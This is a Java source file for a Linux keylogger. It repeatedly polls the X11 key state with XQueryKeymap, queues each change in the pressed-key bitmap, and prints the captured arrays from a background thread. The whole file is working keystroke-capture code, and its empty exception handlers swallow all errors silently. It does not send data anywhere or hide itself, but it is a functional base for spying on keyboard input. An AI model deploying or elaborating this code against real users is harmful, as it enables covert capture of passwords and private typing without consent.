package co.uk.baconi.activity;

import java.util.Arrays;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

import co.uk.baconi.x11.MX11;
import co.uk.baconi.x11.MX11.Display;

public final class LinuxKeyLogger {

    private static final MX11 x11 = MX11.INSTANCE;
    private static final BlockingQueue<byte[]> processQueue = new LinkedBlockingQueue<byte[]>();

    public static void main(final String[] args) {
        System.out.println("START");

        new LinuxKeyLogger().startLogging();

        System.out.println("END");
    }

    private final Display x11Display = x11.XOpenDisplay(null);

    public LinuxKeyLogger() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                processQueue();
            }
        }).start();
    }

    private void startLogging() {
        final byte szKey[] = new byte[32];
        final byte szKeyOld[] = new byte[32];

        for (;;) {
            try {
                x11.XQueryKeymap(x11Display, szKey);
                if (isNotEmpty(szKey) && !Arrays.equals(szKey, szKeyOld)) {
                    processQueue.put(Arrays.copyOf(szKey, szKey.length));
                    System.arraycopy(szKey, 0, szKeyOld, 0, szKey.length);
                } else {
                    Thread.sleep(25);
                }
            } catch (final Throwable t) {
            }
        }
    }

    private boolean isNotEmpty(final byte[] byteArray) {
        for (final byte value : byteArray) {
            if (value != 0) {
                return true;
            }
        }
        return false;
    }

    private static void processQueue() {
        for (;;) {
            try {
                final byte[] szKey = processQueue.take();
                System.out.println("Process Thread: " + Arrays.toString(szKey));
            } catch (final Throwable t) {
                // TODO
            }
        }
    }
}